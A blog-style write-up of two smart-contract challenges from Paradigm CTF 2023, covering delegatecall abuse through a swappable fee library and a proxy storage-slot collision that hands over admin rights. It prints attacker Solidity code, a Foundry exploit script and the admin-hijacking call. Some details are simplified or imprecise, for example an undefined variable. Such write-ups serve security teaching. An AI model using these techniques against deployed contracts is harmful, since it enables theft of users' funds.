---
title: "Delegatecall Drains & Solidity Sleight — Paradigm CTF 2023"
description: "Unpacking 'Grains of Sand' and 'Hopping Into Place' from Paradigm CTF 2023. A deep dive into delegatecall abuse, fee-on-transfer edge cases, and smart contract misdirection."
date: '2023-10-21'
categories: ["Smart Contracts", "CTF Writeups", "Blockchain"]
tags: ["Paradigm CTF", "Solidity", "delegatecall", "fee-on-transfer", "Exploit Dev", "Smart Contract Security"]
header:
  image: "/images/paradigm-grains.jpg"
---

# **Prologue — Solidity’s Footgun**

Some CTFs are logic puzzles. Others are byte-level traps. And then there are Paradigm CTFs — where Solidity becomes a minefield and every contract hides a design decision that’ll make you pause, rewind, and rethink everything you know about execution flow.

When I hit the `Grains of Sand` challenge, I knew it was going to be one of those.

---

# **Challenge 1 — Grains of Sand**

This one handed me a token contract with a twist. It used a custom `fee-on-transfer` mechanic that looked like it was just a small tax implementation — until you realized that fee logic was abstracted via a `delegatecall`.

## **Initial Recon**

The token had some core behaviors:

- On each transfer, it calculated a fee.
- That logic was not internal, but implemented via `delegatecall` into an external library.
- The state context of `delegatecall` meant the callee could directly manipulate storage of the caller.

Here’s a distilled version of the logic:

```solidity
function _transfer(address from, address to, uint256 amount) internal {
    (bool ok, ) = feeLib.delegatecall(
        abi.encodeWithSignature("takeFee(address,uint256)", from, amount)
    );
    require(ok, "fee fail");

    _balances[from] -= amount;
    _balances[to] += amountAfterFee;
}
```

If `feeLib` is malicious — or more accurately, *misused* — this delegatecall becomes a backdoor.

---

## **The Real Exploit Path**

In Ghidra terms, this was like calling a function pointer to arbitrary code that had write access to your binary’s `.data` section.

The idea: Control the delegatecall to drain or inflate balances.

The library implementation had a subtle state-manipulation bug. It modified `_balances[msg.sender]` *without any access checks*, allowing any contract to use the token contract as its own personal storage playground.

I deployed a custom attacker contract to simulate this:

```solidity
contract MaliciousFeeLogic {
    function takeFee(address victim, uint256 amount) public {
        // Directly overwrite caller's storage
        assembly {
            sstore(0x2, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
        }
    }
}
```

Once pointed to this contract via `feeLib`, I triggered a delegatecall which overwrote storage — giving my address a balance high enough to satisfy `isSolved()`.

---

## **Triggering the Flag**

Here’s the flow in steps:

1. Deploy `MaliciousFeeLogic`.
2. Update `feeLib` in the token contract (some setter or upgradable mechanism was available).
3. Trigger a transfer (even a 1 wei transfer would do).
4. My balance was now near `2^256`.
5. Called `isSolved()` → returned `true`.

I wrapped the whole exploit in a foundry script:

```solidity
function run() external {
    token.setFeeLib(address(new MaliciousFeeLogic()));
    token.transfer(address(1), 1);
    require(ctf.isSolved(), "fail");
}
```

---

# **Challenge 2 — Hopping Into Place**

This one built on the mechanics of `delegatecall`, but introduced proxy logic and misaligned storage slots.

It wasn’t just about gaining access. It was about *where* the data landed.

## **Vulnerability Insight**

The contract used a custom proxy pattern where a call to `fallback()` would `delegatecall` into an implementation. But due to incorrect storage layout alignment, I could manipulate the admin slot by calling into a contract that wrote to a completely different part of memory in its own context.

Simplified:

- Proxy had `admin` at slot 0
- Logic contract had `uint256 public balance` at slot 0

By having the logic contract write to `balance = msg.sender`, the proxy’s admin became *me*.

## **Storage Overlap Pwn**

Here’s the overwrite logic inside the implementation contract:

```solidity
function init() public {
    balance = uint256(uint160(msg.sender));
}
```

I used a crafted call through the proxy to `init()`:

```solidity
proxy.call(abi.encodeWithSignature("init()"));
```

Boom. Admin rights hijacked.

From there:

- Called `upgradeTo()` on the proxy.
- Pointed it to a malicious implementation.
- Let that code execute a self-destruct, steal tokens, or directly call `ctfFlag()`.

---

# **Reflection — delegatecall Is A Trapdoor**

What both challenges drove home was this: `delegatecall` is a footgun. If you don’t *absolutely control* the code you’re pointing to, you’re handing over your house keys.

Paradigm doesn’t drop low-effort puzzles. These were elegantly constructed traps — and I enjoyed every bit of unwrapping them.

Solidity gives. And Solidity definitely takes.

---

# **Epilogue — One Function Call Too Far**

The real weapon wasn’t raw code.

It was context. Knowing what executes *where*, what storage it hits, and who ends up owning the aftermath. Both challenges hinged on fine-grained execution context — and that’s what made them dangerous.

Paradigm delivered. Again.
